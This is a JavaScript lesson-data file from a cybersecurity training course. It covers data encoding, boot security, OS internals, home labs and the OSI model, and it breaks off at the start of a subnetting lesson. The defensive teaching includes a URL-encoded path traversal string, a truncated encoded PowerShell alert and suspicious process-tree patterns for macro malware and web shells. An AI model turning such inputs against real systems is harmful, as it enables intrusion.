// CyberPath lessons — Phase 0 (Foundations: IT & Networking) and Phase 1 (Security Fundamentals / Security+ SY0-701)
// See docs/CONTENT_SCHEMA.md. All HTML is inside template literals: literal backslashes are written as \\.
window.CP = window.CP || {};
CP.lessons = CP.lessons || [];

// ===================== p0-m1 How Computers & Operating Systems Work =====================
CP.lessons.push(
{
  id: "p0-m1-l1",
  module: "p0-m1",
  title: "Binary, Hex and How Computers Represent Data",
  minutes: 15,
  objectives: [
    "Convert numbers between decimal, binary and hexadecimal",
    "Explain bits, bytes and character encodings (ASCII, UTF-8)",
    "Recognize Base64 and decode it safely",
    "Identify file types from their magic bytes instead of trusting extensions"
  ],
  html: `<p>Every alert you will ever triage, every packet you capture and every malware sample you inspect is, underneath, just a long string of ones and zeros. Security analysts constantly read data in raw form — an IP address written in binary for subnetting, a hex dump of a suspicious file, a Base64 blob hidden in a PowerShell command. This lesson gives you the number systems you need so that raw data stops looking like noise.</p>

<h3>Bits and bytes</h3>
<p>A <b>bit</b> is a single binary digit: 0 or 1 (off or on). Eight bits make a <b>byte</b>, which can hold 2<sup>8</sup> = 256 distinct values (0–255). Larger units follow: a kilobyte is 1,000 bytes (or 1,024 when you see "KiB"), a megabyte about a million, and so on. Storage vendors use powers of 10, operating systems often show powers of 2 — that is why a "1 TB" disk appears as about 931 GB in Windows.</p>

<h3>Binary (base 2)</h3>
<p>In decimal each position is a power of 10. In binary each position is a power of 2. For a byte the place values are:</p>
<table>
<tr><th>128</th><th>64</th><th>32</th><th>16</th><th>8</th><th>4</th><th>2</th><th>1</th></tr>
<tr><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>
</table>
<p>That row is <code>11000000</code> = 128 + 64 = <b>192</b>. To convert decimal to binary, subtract the largest place value that fits and mark a 1, repeating until you reach zero. Example: 172 = 128 + 32 + 8 + 4 → <code>10101100</code>. You will use exactly this skill when you subnet (an IPv4 address is four bytes, or "octets").</p>

<h3>Hexadecimal (base 16)</h3>
<p>Binary is long, so humans use <b>hex</b>: digits 0–9 then A–F (A=10 … F=15). One hex digit represents exactly four bits (a "nibble"), so one byte is always two hex digits. That makes conversion easy: split the byte into two nibbles.</p>
<pre><code>11000000  -&gt;  1100 | 0000  -&gt;  C | 0  -&gt;  0xC0  (=192)
11111111  -&gt;  1111 | 1111  -&gt;  F | F  -&gt;  0xFF  (=255)
00011111  -&gt;  0001 | 1111  -&gt;  1 | F  -&gt;  0x1F  (=31)</code></pre>
<p>Hex appears everywhere in security: MAC addresses (<code>00:1A:2B:3C:4D:5E</code>), IPv6 addresses, memory addresses in crash dumps, hash values (a SHA-256 hash is 64 hex characters = 256 bits) and Windows status codes such as <code>0xC000006A</code> (wrong password) in failed-logon events.</p>

<h3>Characters and encodings</h3>
<p>Text is stored as numbers too. <b>ASCII</b> maps 128 characters to values 0–127: <code>A</code> is 0x41, <code>a</code> is 0x61, a space is 0x20. <b>UTF-8</b> is the modern standard (RFC 3629): it is backward-compatible with ASCII and uses 1–4 bytes per character so it can encode every language and emoji. Attackers abuse encodings — for example look-alike Unicode characters in domains (a Cyrillic "а" in a phishing URL) or URL-encoding (<code>%2e%2e%2f</code> = <code>../</code>) to sneak past filters.</p>

<h3>Base64: encoding, not encryption</h3>
<p><b>Base64</b> (RFC 4648) represents binary data using 64 printable characters (A–Z, a–z, 0–9, +, /) with <code>=</code> as padding. It is used legitimately in email attachments, JSON web tokens and certificates — and constantly by attackers to hide commands. Decoding requires no key:</p>
<pre><code>$ echo 'YWRtaW4=' | base64 -d
admin
$ echo -n 'admin' | base64
YWRtaW4=</code></pre>
<div class="callout warn"><b>Encoding is not security.</b> Base64, hex and URL-encoding hide nothing from anyone who knows to decode them. If a vendor says passwords are "encrypted with Base64", that is a finding, not a feature.</div>
<div class="callout real"><b>On the job:</b> a classic SOC alert is <code>powershell.exe -enc JABjAD0A...</code>. The <code>-enc</code> (EncodedCommand) parameter takes Base64 of UTF-16LE text. Analysts decode it (CyberChef "From Base64" then "Decode text UTF-16LE") to see the real script. Never run the decoded payload — just read it.</div>

<h3>Magic bytes: what a file really is</h3>
<p>File extensions are just part of the name and are trivial to fake (<code>invoice.pdf.exe</code>). The first few bytes of a file — its <b>magic number</b> or file signature — reveal the real format:</p>
<table>
<tr><th>Format</th><th>Magic bytes (hex)</th><th>As text</th></tr>
<tr><td>Windows executable (PE)</td><td>4D 5A</td><td>MZ</td></tr>
<tr><td>Linux executable (ELF)</td><td>7F 45 4C 46</td><td>.ELF</td></tr>
<tr><td>PDF</td><td>25 50 44 46</td><td>%PDF</td></tr>
<tr><td>ZIP / DOCX / XLSX / JAR</td><td>50 4B 03 04</td><td>PK..</td></tr>
<tr><td>PNG</td><td>89 50 4E 47</td><td>.PNG</td></tr>
</table>
<pre><code>$ file invoice.pdf
invoice.pdf: PE32+ executable (GUI) x86-64, for MS Windows
$ xxd invoice.pdf | head -1
00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............</code></pre>
<p>That "PDF" is actually a Windows program — a strong indicator of malware delivery. Note that modern Office documents (.docx) start with <code>PK</code> because they are ZIP archives full of XML.</p>
<div class="callout tip"><b>Practice:</b> convert your own IP address octets to binary by hand, then check with a calculator. Bookmark CyberChef (gchq.github.io/CyberChef) — it runs locally in your browser and is a standard SOC tool for decoding.</div>
<div class="callout exam"><b>Exam mapping:</b> CompTIA A+ Core 1 (220-1101) and Core 2 (220-1102) assume comfort with storage units and file types; Network+ (N10-009) Domain 1.0 Networking Concepts relies on binary for IPv4 and hex for IPv6 and MAC addresses.</div>`,
  keyTerms: [
    ["Bit", "A single binary digit, 0 or 1"],
    ["Byte / Octet", "Eight bits; holds values 0–255"],
    ["Hexadecimal", "Base-16 notation; one hex digit = 4 bits, two digits = one byte"],
    ["ASCII", "7-bit character encoding mapping 128 characters to numbers"],
    ["UTF-8", "Variable-length Unicode encoding (1–4 bytes), backward-compatible with ASCII"],
    ["Base64", "Binary-to-text encoding with 64 printable characters; reversible without any key"],
    ["Magic bytes", "Signature bytes at the start of a file that identify its true format"],
    ["Nibble", "Four bits; represented by one hex digit"]
  ],
  standards: ["RFC 4648", "RFC 3629"],
  labs: ["lab-subnet"]
},
{
  id: "p0-m1-l2",
  module: "p0-m1",
  title: "Hardware, Firmware and the Boot Process",
  minutes: 15,
  objectives: [
    "Describe the roles of the CPU, RAM, storage and motherboard",
    "Explain BIOS vs UEFI and how Secure Boot works",
    "Describe what a TPM does and why it matters for BitLocker and Windows 11",
    "Walk through the boot sequence and where attackers try to persist"
  ],
  html: `<p>You do not need to be a hardware technician to work in security, but you must understand what happens between pressing the power button and seeing a login screen. Some of the most dangerous attacks — bootkits and firmware implants — live in exactly that gap, below where antivirus can see.</p>

<h3>The core components</h3>
<table>
<tr><th>Component</th><th>What it does</th><th>Security relevance</th></tr>
<tr><td>CPU</td><td>Executes instructions; has cores, cache and privilege rings</td><td>Hardware flaws (Spectre/Meltdown class side channels); virtualization extensions (Intel VT-x, AMD-V)</td></tr>
<tr><td>RAM</td><td>Fast, <b>volatile</b> working memory — lost at power off</td><td>Holds decryption keys, passwords, injected malware; memory forensics must capture it before shutdown</td></tr>
<tr><td>Storage (HDD/SSD/NVMe)</td><td><b>Non-volatile</b> long-term storage</td><td>Needs full-disk encryption; SSD wear-levelling makes secure deletion harder</td></tr>
<tr><td>Motherboard &amp; firmware</td><td>Connects everything; firmware initializes hardware</td><td>Firmware implants survive OS reinstalls</td></tr>
<tr><td>NIC</td><td>Network interface card; has a MAC address</td><td>Source of network telemetry; MAC can be spoofed</td></tr>
</table>
<p>The volatility difference matters in incident response. The <b>order of volatility</b> (RFC 3227) says to collect the most short-lived evidence first: CPU registers and cache, then RAM, then network state and running processes, then disk, then backups and archives.</p>

<h3>Firmware: BIOS and UEFI</h3>
<p>Firmware is software stored on a chip on the motherboard. The legacy <b>BIOS</b> (Basic Input/Output System) dates to the 1980s, runs in 16-bit mode and boots from the Master Boot Record (MBR). Its replacement, <b>UEFI</b> (Unified Extensible Firmware Interface), is a small operating system in its own right: it supports GPT-partitioned disks larger than 2 TB, a graphical setup, networking and — critically — <b>Secure Boot</b>.</p>

<h4>Secure Boot</h4>
<p>Secure Boot uses digital signatures to build a chain of trust. The firmware holds a database of trusted keys (<code>db</code>), a database of revoked signatures (<code>dbx</code>), and platform keys. Before handing control to a bootloader, UEFI checks its signature. The bootloader checks the kernel, and the kernel checks drivers. Unsigned or revoked code is refused. This blocks most bootkits — though not all: the <b>BlackLotus</b> bootkit (2023) exploited a vulnerable but still-signed Windows boot manager (CVE-2022-21894), which is why keeping the <code>dbx</code> revocation list updated matters. Microsoft is also rotating its original 2011 Secure Boot certificates, which expire in 2026, so expect firmware and certificate updates on managed fleets.</p>

<h3>The TPM</h3>
<p>A <b>Trusted Platform Module</b> (TPM 2.0, required for Windows 11) is a tamper-resistant crypto chip — discrete or built into the CPU firmware. It can generate and store keys that never leave the chip, and it records <b>measurements</b> (hashes) of each boot component into Platform Configuration Registers (PCRs). This enables:</p>
<ul>
<li><b>Measured boot / attestation</b> — a remote service can verify the device booted cleanly before granting access (a zero trust building block).</li>
<li><b>BitLocker</b> — Windows full-disk encryption seals the key to the TPM, so it is released only if the boot measurements match. Move the disk to another computer and it stays encrypted.</li>
<li><b>Windows Hello and passkeys</b> — private keys protected by hardware.</li>
</ul>
<div class="callout tip">Related hardware security terms you will meet: <b>HSM</b> (hardware security module — a network appliance or card holding keys for servers and CAs) and <b>secure enclave</b> (an isolated processor area, e.g. Apple Secure Enclave).</div>

<h3>The boot sequence step by step</h3>
<ol>
<li><b>Power on → POST</b>: the firmware runs a Power-On Self-Test of CPU, RAM and devices.</li>
<li><b>Firmware initialization</b>: UEFI reads its settings (stored in NVRAM) and determines boot order.</li>
<li><b>Bootloader</b>: UEFI loads a signed bootloader from the EFI System Partition — <code>bootmgfw.efi</code> on Windows, <code>shimx64.efi</code>/GRUB on most Linux distributions.</li>
<li><b>Kernel load</b>: the bootloader loads the OS kernel (<code>ntoskrnl.exe</code> or <code>vmlinuz</code>) and early drivers. Windows ELAM (Early Launch Anti-Malware) lets security drivers start first.</li>
<li><b>Init / session manager</b>: Linux starts <code>systemd</code> (PID 1); Windows starts <code>smss.exe</code>, then <code>wininit.exe</code>, <code>services.exe</code> and <code>lsass.exe</code>.</li>
<li><b>Login</b>: the user authenticates and their session and startup programs launch.</li>
</ol>
<div class="callout real"><b>On the job:</b> attackers love persistence that triggers at boot or logon — services, Run registry keys, scheduled tasks, systemd units, cron <code>@reboot</code>. When you investigate a compromised host, "what starts automatically?" is one of the first questions you ask. Firmware-level persistence (e.g. LoJax, CosmicStrand, MoonBounce) is rare but survives disk wipes, which is why high-assurance responses may reflash firmware or replace hardware.</div>

<h3>Hardening the platform</h3>
<ul>
<li>Set a firmware (UEFI) administrator password and disable booting from USB/network unless needed.</li>
<li>Enable Secure Boot and TPM; apply firmware updates from the vendor like any other patch.</li>
<li>Enable full-disk encryption (BitLocker, FileVault, LUKS) on all laptops.</li>
<li>Follow NIST SP 800-193 (Platform Firmware Resiliency) concepts: protect, detect and recover firmware.</li>
</ul>
<div class="callout exam"><b>Exam mapping:</b> A+ Core 1 (220-1101) Domain 3.0 Hardware covers motherboards, BIOS/UEFI, Secure Boot and TPM. Security+ SY0-701 objective 3.1/4.1 references secure boot, TPM, HSM and secure enclaves — you will see these again in Phase 1.</div>`,
  keyTerms: [
    ["UEFI", "Modern firmware interface replacing BIOS; supports GPT disks and Secure Boot"],
    ["Secure Boot", "UEFI feature that only runs boot components with trusted digital signatures"],
    ["TPM", "Trusted Platform Module: hardware chip that stores keys and boot measurements"],
    ["PCR", "Platform Configuration Register in a TPM holding hashes of boot components"],
    ["POST", "Power-On Self-Test performed by firmware at startup"],
    ["Bootkit", "Malware that infects the boot process to load before the OS"],
    ["Volatile memory", "Memory (RAM) whose contents are lost when power is removed"],
    ["Order of volatility", "Collect the most short-lived evidence first (RFC 3227)"],
    ["BitLocker", "Windows full-disk encryption that typically seals its key to the TPM"]
  ],
  standards: ["RFC 3227", "NIST SP 800-193", "NIST SP 800-147"]
},
{
  id: "p0-m1-l3",
  module: "p0-m1",
  title: "What an Operating System Does: Processes, Memory and File Systems",
  minutes: 18,
  objectives: [
    "Explain kernel mode vs user mode and why privilege separation exists",
    "Distinguish programs, processes, threads and services",
    "Describe virtual memory and why attackers target process memory",
    "Compare common file systems and their security features"
  ],
  html: `<p>An operating system (OS) is the referee between hardware and the programs you run. It decides which program gets the CPU, keeps programs from reading each other's memory, enforces who may open which file, and talks to devices through drivers. Almost every security control on a computer is, in the end, an OS feature — and almost every attack is an attempt to trick or bypass the OS.</p>

<h3>Kernel mode and user mode</h3>
<p>CPUs provide privilege levels ("rings"). The <b>kernel</b> — the core of the OS — runs in the most privileged mode (ring 0) with full access to hardware and memory. Normal applications run in <b>user mode</b> (ring 3) and must ask the kernel for anything sensitive through <b>system calls</b> (open a file, send a packet, start a process). This boundary is why a crashing browser does not crash your computer, and why "kernel-level" access is the attacker's prize: code in the kernel can hide files, processes and network connections from every user-mode tool — the definition of a <b>rootkit</b>.</p>
<div class="callout real"><b>On the job:</b> EDR products run kernel drivers to see everything, which is powerful but risky — the July 2024 CrowdStrike Falcon content update crashed about 8.5 million Windows machines because faulty input was processed in kernel mode. Microsoft has since been moving security vendors toward running more of their logic outside the kernel. Attackers, meanwhile, use "bring your own vulnerable driver" (BYOVD) techniques to load signed-but-buggy drivers and kill security tools.</div>

<h3>Programs, processes, threads and services</h3>
<ul>
<li>A <b>program</b> is a file on disk (<code>notepad.exe</code>, <code>/usr/bin/ssh</code>).</li>
<li>A <b>process</b> is a running instance of a program with its own memory space, a process ID (<b>PID</b>), a parent process (PPID), an owner (user account) and a security context (token).</li>
<li>A <b>thread</b> is a unit of execution inside a process; one process can have many threads sharing its memory.</li>
<li>A <b>service</b> (Windows) or <b>daemon</b> (Linux) is a background process usually started at boot, often running with high privileges (SYSTEM or root).</li>
</ul>
<p>Every process has a parent, which forms a <b>process tree</b>. Analysts read process trees constantly because unusual parent/child relationships are strong attack signals:</p>
<table>
<tr><th>Parent → Child</th><th>Verdict</th></tr>
<tr><td>explorer.exe → chrome.exe</td><td>Normal: user launched browser</td></tr>
<tr><td>services.exe → svchost.exe</td><td>Normal: service host</td></tr>
<tr><td>winword.exe → powershell.exe</td><td><b>Suspicious</b>: a Word document spawning a shell is a classic macro-malware pattern</td></tr>
<tr><td>w3wp.exe (IIS) → cmd.exe</td><td><b>Suspicious</b>: possible web shell on a web server</td></tr>
</table>

<h3>Memory management</h3>
<p>The OS gives each process its own <b>virtual address space</b>: the process believes it has a large private range of memory, and the OS maps those virtual addresses to physical RAM pages. When RAM is full, rarely used pages are moved to disk (<code>pagefile.sys</code> on Windows, swap on Linux) — which means secrets from memory can end up on disk, a gift for forensic investigators.</p>
<p>Protections you will hear about:</p>
<ul>
<li><b>ASLR</b> (Address Space Layout Randomization) — loads code at random addresses so exploits cannot hard-code where things are.</li>
<li><b>DEP/NX</b> (Data Execution Prevention / No-eXecute) — marks data areas such as the stack as non-executable.</li>
<li><b>Process isolation</b> — one process cannot read another's memory without special privileges (e.g. <code>SeDebugPrivilege</code>). Credential-theft tools such as Mimikatz need such privileges to read <code>lsass.exe</code> memory, where Windows caches credential material.</li>
</ul>
<p>Malware often avoids touching disk by running purely in memory (<b>fileless</b> malware) or by injecting code into a legitimate process (<b>process injection</b>, MITRE ATT&amp;CK T1055), which is why memory analysis matters.</p>

<h3>File systems</h3>
<table>
<tr><th>File system</th><th>Used by</th><th>Notable features</th></tr>
<tr><td>NTFS</td><td>Windows</td><td>ACL permissions, journaling, Alternate Data Streams (can hide data), the MFT records metadata and timestamps</td></tr>
<tr><td>ReFS</td><td>Windows Server</td><td>Resilience and integrity checksums for large storage</td></tr>
<tr><td>FAT32 / exFAT</td><td>USB drives, SD cards</td><td>No permissions at all; FAT32 max file size 4 GB</td></tr>
<tr><td>ext4</td><td>Most Linux</td><td>Journaling, Unix permissions (owner/group/other), inodes</td></tr>
<tr><td>XFS / Btrfs</td><td>RHEL / some Linux</td><td>Large volumes, snapshots (Btrfs)</td></tr>
<tr><td>APFS</td><td>macOS / iOS</td><td>Native encryption, snapshots, copy-on-write</td></tr>
</table>
<p>File systems keep <b>metadata</b>: owner, permissions and timestamps (often called MACB — Modified, Accessed, Changed, Born/created). Forensic timelines are built from this metadata. Attackers "timestomp" files to make malware look old, but NTFS keeps a second set of timestamps in the MFT that are harder to fake.</p>
<pre><code># Linux: show inode, permissions and all timestamps for a file
$ stat /etc/passwd

# Windows: list Alternate Data Streams in the current folder
C:\\&gt; dir /r</code></pre>
<div class="callout tip">You will practice Linux permissions in module p0-m3 and Windows ACLs in p0-m4. For now remember: permissions are enforced by the OS, so anyone who boots another OS or pulls the disk bypasses them — the reason full-disk encryption matters.</div>
<div class="callout exam"><b>Exam mapping:</b> A+ Core 2 (220-1102) Domain 1.0 Operating Systems covers OS types, file systems (NTFS, ext4, APFS, FAT32, exFAT) and Task Manager; Security+ SY0-701 Domain 2.0 covers rootkits, fileless malware and memory injection.</div>`,
  keyTerms: [
    ["Kernel", "Core of the OS running in privileged mode with full hardware access"],
    ["System call", "Request from a user-mode program to the kernel for a privileged operation"],
    ["Process", "A running instance of a program with its own memory, PID and security context"],
    ["PID / PPID", "Process ID and Parent Process ID; form the process tree"],
    ["Virtual memory", "Per-process address space mapped by the OS to physical RAM or disk"],
    ["ASLR", "Randomizes memory locations to make exploitation harder"],
    ["Rootkit", "Malware that hides itself, often by running in kernel mode"],
    ["NTFS", "Windows file system with ACLs, journaling and Alternate Data Streams"],
    ["Process injection", "Running malicious code inside another legitimate process's memory"]
  ],
  standards: ["MITRE ATT&CK T1055", "MITRE ATT&CK T1014"]
},
{
  id: "p0-m1-l4",
  module: "p0-m1",
  title: "Virtualization, Containers and Building Your Home Lab",
  minutes: 15,
  objectives: [
    "Distinguish Type 1 and Type 2 hypervisors",
    "Compare virtual machines and containers",
    "Use snapshots and network isolation safely",
    "Plan a beginner security home lab"
  ],
  html: `<p>Nearly every server you will defend runs on virtualization, whether in a corporate data center or in AWS, Azure or Google Cloud. Virtualization is also how you will practice: a home lab lets you break things, attack things and watch logs without risking anything real. Hiring managers routinely ask "tell me about your home lab", so this lesson pays off twice.</p>

<h3>Hypervisors</h3>
<p>A <b>hypervisor</b> lets one physical machine (the <b>host</b>) run many <b>virtual machines</b> (the <b>guests</b>), each with its own virtual CPU, RAM, disk and network card.</p>
<table>
<tr><th></th><th>Type 1 ("bare metal")</th><th>Type 2 ("hosted")</th></tr>
<tr><td>Runs on</td><td>Directly on hardware</td><td>On top of a normal OS</td></tr>
<tr><td>Examples</td><td>VMware ESXi, Microsoft Hyper-V, Proxmox VE (KVM), Xen</td><td>VirtualBox, VMware Workstation, Parallels, UTM</td></tr>
<tr><td>Typical use</td><td>Data centers, cloud providers</td><td>Laptops, labs, testing</td></tr>
</table>
<p>The hypervisor enforces isolation between guests. A <b>VM escape</b> — code in a guest breaking out to the host — is one of the most serious vulnerability classes, and cloud providers pay large bug bounties for them. <b>VM sprawl</b> (forgotten, unpatched VMs) is the more common real-world problem.</p>

<h3>Containers</h3>
<p>A <b>container</b> (Docker, Podman, containerd, orchestrated by Kubernetes) packages an application with its libraries but <b>shares the host's kernel</b>. Linux namespaces give each container its own view of processes, network and file system, and cgroups limit its CPU and memory.</p>
<table>
<tr><th></th><th>Virtual machine</th><th>Container</th></tr>
<tr><td>Isolation boundary</td><td>Hypervisor (strong)</td><td>Shared kernel (weaker)</td></tr>
<tr><td>Startup</td><td>Seconds to minutes</td><td>Milliseconds to seconds</td></tr>
<tr><td>Size</td><td>Gigabytes (full OS)</td><td>Megabytes</td></tr>
<tr><td>Security watch-outs</td><td>Patch every guest OS</td><td>Privileged containers, vulnerable base images, exposed Docker socket</td></tr>
</table>
<div class="callout warn">Running a container with <code>--privileged</code> or mounting <code>/var/run/docker.sock</code> into it effectively gives that container root on the host. This is a common finding in cloud and DevOps environments.</div>

<h3>Snapshots and virtual networks</h3>
<p>A <b>snapshot</b> captures a VM's disk (and optionally memory) at a point in time. Take a clean snapshot before every experiment; revert afterwards. In incident response, snapshotting a compromised cloud VM preserves evidence including memory.</p>
<p>Virtual network modes decide what a VM can reach:</p>
<ul>
<li><b>NAT</b> — the VM reaches the internet through the host; nothing outside can reach it. Good default.</li>
<li><b>Bridged</b> — the VM appears on your real home network with its own IP. Avoid for anything vulnerable or malicious.</li>
<li><b>Host-only / Internal</b> — VMs talk only to each other (and maybe the host). <b>Use this for malware and attack labs.</b></li>
</ul>

<h3>A practical beginner home lab</h3>
<p>You need a computer with at least 16 GB RAM (32 GB is comfortable) and a free hypervisor. Start small and grow:</p>
<ol>
<li><b>Linux workstation</b> — Ubuntu Desktop or Kali Linux for tools and command-line practice.</li>
<li><b>Windows target</b> — Microsoft offers free time-limited evaluation editions of Windows 11 Enterprise and Windows Server 2025. Install Sysmon for rich logging.</li>
<li><b>Domain controller</b> — promote Windows Server to an Active Directory domain controller and join the Windows client. Now you can study Kerberos, Group Policy and Event IDs 4624/4625/4769.</li>
<li><b>SIEM</b> — Wazuh, Elastic (free tier) or Splunk Free/trial to collect logs from the others.</li>
<li><b>Firewall/router</b> — pfSense or OPNsense VM to segment the lab network.</li>
</ol>
<pre><code># Quick Linux sanity checks inside a new VM
$ hostnamectl          # OS, kernel and virtualization type
$ ip -br addr          # interfaces and IP addresses
$ systemd-detect-virt  # prints e.g. "kvm" or "oracle" (VirtualBox)</code></pre>
<div class="callout tip">No spare hardware? Cloud free tiers and browser-based platforms (TryHackMe, Hack The Box, LetsDefend, Blue Team Labs Online, CyberDefenders) provide ready-made labs. Use both: platforms for guided practice, your own lab for depth.</div>
<div class="callout real"><b>On the job:</b> document your lab on GitHub or a blog — network diagram, what you built, what you detected. A screenshot of a Kerberoasting detection you wrote in your own SIEM is more persuasive in an interview than any certificate.</div>
<div class="callout warn"><b>Ethics and law:</b> only attack systems you own or have written permission to test. Keep malware strictly in isolated, host-only networks and never on your work laptop.</div>
<div class="callout exam"><b>Exam mapping:</b> A+ Core 1 (220-1101) Domain 4.0 Virtualization and Cloud Computing (hypervisor types, VM requirements, cloud models). Security+ SY0-701 objective 3.1 covers virtualization and containerization architecture considerations, and 2.3 covers VM escape and resource reuse.</div>`,
  keyTerms: [
    ["Hypervisor", "Software that creates and runs virtual machines"],
    ["Type 1 hypervisor", "Runs directly on hardware (ESXi, Hyper-V, Proxmox)"],
    ["Type 2 hypervisor", "Runs as an application on a host OS (VirtualBox, VMware Workstation)"],
    ["Container", "Lightweight isolated app environment sharing the host kernel"],
    ["Snapshot", "Point-in-time copy of a VM's state that can be reverted to"],
    ["VM escape", "Breaking out of a guest VM to access the host or other guests"],
    ["Host-only network", "Virtual network isolated from the internet and physical LAN"],
    ["Namespaces / cgroups", "Linux kernel features providing container isolation and resource limits"]
  ],
  standards: ["NIST SP 800-125", "NIST SP 800-190"],
  labs: ["lab-linux-terminal"]
}
);

// ===================== p0-m2 Networking Fundamentals =====================
CP.lessons.push(
{
  id: "p0-m2-l1",
  module: "p0-m2",
  title: "The OSI and TCP/IP Models",
  minutes: 15,
  objectives: [
    "Name the seven OSI layers and the four TCP/IP layers",
    "Map common protocols and devices to their layer",
    "Explain encapsulation and the PDU at each layer",
    "Use the layers to troubleshoot and to classify attacks"
  ],
  html: `<p>Networks are built in layers. Each layer solves one problem — moving bits over a wire, getting a frame to the next device, routing a packet across the internet, delivering data to the right application — and relies on the layer below. Models give us a shared vocabulary: when a colleague says "it's a layer 7 problem" or "that firewall only filters at layer 4", you need to know exactly what they mean.</p>

<h3>The OSI model (7 layers)</h3>
<p>The OSI (Open Systems Interconnection) reference model, ISO/IEC 7498-1, is used for teaching and troubleshooting. A common mnemonic from layer 1 up is <i>"Please Do Not Throw Sausage Pizza Away"</i>.</p>
<table>
<tr><th>#</th><th>Layer</th><th>Job</th><th>PDU</th><th>Examples</th></tr>
<tr><td>7</td><td>Application</td><td>Network services for applications</td><td>Data</td><td>HTTP, DNS, SMTP, SSH</td></tr>
<tr><td>6</td><td>Presentation</td><td>Formatting, encoding, encryption</td><td>Data</td><td>TLS (often placed here), JPEG, ASCII/UTF-8</td></tr>
<tr><td>5</td><td>Session</td><td>Opening/closing/maintaining sessions</td><td>Data</td><td>RPC, NetBIOS sessions, SMB session setup</td></tr>
<tr><td>4</td><td>Transport</td><td>End-to-end delivery, ports, reliability</td><td>Segment (TCP) / Datagram (UDP)</td><td>TCP, UDP, QUIC</td></tr>
<tr><td>3</td><td>Network</td><td>Logical addressing and routing</td><td>Packet</td><td>IPv4, IPv6, ICMP, routers</td></tr>
<tr><td>2</td><td>Data Link</td><td>Delivery on the local segment, MAC addresses</td><td>Frame</td><td>Ethernet, Wi-Fi (802.11), ARP, switches, VLANs</td></tr>
<tr><td>1</td><td>Physical</td><td>Bits as signals on a medium</td><td>Bits</td><td>Cables, fiber, radio, hubs</td></tr>
</table>

<h3>The TCP/IP model (4 layers)</h3>
<p>The internet actually runs on the TCP/IP suite (described in RFC 1122). Its four layers collapse OSI's:</p>
<ul>
<li><b>Application</b> = OSI 5–7</li>
<li><b>Transport</b> = OSI 4</li>
<li><b>Internet</b> = OSI 3</li>
<li><b>Link</b> (Network Access) = OSI 1–2</li>
</ul>
<p>Practitioners mix the two freely: "layer 7 firewall" and "layer 2 attack" use OSI numbering even when talking about TCP/IP networks.</p>

<h3>Encapsulation</h3>
<p>When you load a web page, your data travels <i>down</i> the stack on your machine, and each layer wraps it with its own header (encapsulation). The receiver unwraps it going <i>up</i> (de-encapsulation).</p>
<pre><code>[ HTTP GET /index.html ]                                   L7 data
[ TCP hdr: src 51514 -&gt; dst 443 | data ]                   L4 segment
[ IP hdr: 192.168.1.20 -&gt; 93.184.215.14 | TCP | data ]     L3 packet
[ Eth hdr: MAC a -&gt; MAC router | IP | TCP | data | FCS ]   L2 frame
0101100101110...                                           L1 bits</code></pre>
<p>Note that the Ethernet destination is the <b>router's</b> MAC address, not the web server's — MAC addresses only matter on the local segment, while IP addresses stay the same end to end (unless NAT rewrites them). This single fact explains a huge amount of network behavior and is a favorite exam question.</p>

<h3>Devices by layer</h3>
<table>
<tr><th>Device</th><th>Layer</th><th>Makes decisions on</th></tr>
<tr><td>Hub (obsolete)</td><td>1</td><td>Nothing — repeats bits to every port</td></tr>
<tr><td>Switch</td><td>2</td><td>MAC addresses (MAC address table)</td></tr>
<tr><td>Router / Layer 3 switch</td><td>3</td><td>IP addresses (routing table)</td></tr>
<tr><td>Stateful firewall</td><td>3–4</td><td>IPs, ports, connection state</td></tr>
<tr><td>NGFW / WAF / proxy</td><td>7</td><td>Application content, URLs, users</td></tr>
</table>

<h3>Using layers for troubleshooting and security</h3>
<p>Troubleshoot bottom-up: Is the cable connected / Wi-Fi associated (L1)? Do I have a link and the right VLAN (L2)? Do I have an IP and can I ping the gateway (L3)? Is the port open (L4)? Does the application respond correctly (L7)?</p>
<p>Attacks map to layers too, which helps you choose the right defense:</p>
<table>
<tr><th>Layer</th><th>Example attack</th><th>Example defense</th></tr>
<tr><td>1</td><td>Cable tapping, rogue device plugged into a wall port</td><td>Physical security, 802.1X port authentication</td></tr>
<tr><td>2</td><td>ARP spoofing, MAC flooding, VLAN hopping</td><td>Dynamic ARP Inspection, port security</td></tr>
<tr><td>3</td><td>IP spoofing, ICMP floods</td><td>Ingress filtering (BCP 38), rate limiting</td></tr>
<tr><td>4</td><td>SYN flood, port scanning</td><td>SYN cookies, stateful firewall</td></tr>
<tr><td>7</td><td>SQL injection, HTTP floods, DNS tunneling</td><td>WAF, input validation, DNS monitoring</td></tr>
</table>
<div class="callout tip">QUIC (RFC 9000), the transport under HTTP/3, runs over UDP 443 and encrypts almost all of its own headers. It blurs the neat layer boundaries — and it means traditional inspection tools may see much less than they did with TCP.</div>
<div class="callout real"><b>On the job:</b> in Wireshark, the packet details pane is literally the stack: Frame, Ethernet II, Internet Protocol, TCP, then the application protocol. Learning to read top-to-bottom like this is the foundation of network traffic analysis in Phase 2.</div>
<div class="callout exam"><b>Exam mapping:</b> Network+ N10-009 objective 1.1 "Explain concepts related to the OSI reference model" — expect questions on which layer a device, protocol or PDU belongs to. Security+ SY0-701 objective 3.2 uses layer terminology for firewalls (layer 4 vs layer 7).</div>`,
  keyTerms: [
    ["OSI model", "Seven-layer reference model for network communication (ISO/IEC 7498-1)"],
    ["TCP/IP model", "Four-layer model the internet actually uses: Link, Internet, Transport, Application"],
    ["Encapsulation", "Each layer wraps data with its own header on the way down the stack"],
    ["PDU", "Protocol Data Unit: bits, frame, packet, segment/datagram, data"],
    ["MAC address", "48-bit hardware address used for delivery on the local segment (layer 2)"],
    ["Frame", "Layer 2 PDU, e.g. an Ethernet frame with source/destination MAC"],
    ["Packet", "Layer 3 PDU with source/destination IP addresses"],
    ["Segment", "Layer 4 TCP PDU containing ports and sequence numbers"]
  ],
  standards: ["ISO/IEC 7498-1", "RFC 1122", "RFC 9000", "BCP 38 (RFC 2827)"],
  labs: ["lab-ports"]
},
{
  id: "p0-m2-l2",
  module: "p0-m2",
  title: "IPv4 Addressing and Subnetting (with Worked Examples)",
  minutes: 25,
  objectives: [
    "Read IPv4 addresses, subnet masks and CIDR notation",
    "Calculate network address, broadcast address and usable host range",
    "Identify private, loopback, link-local and other special ranges",
    "Describe IPv6 address format and key differences from IPv4"
  ],
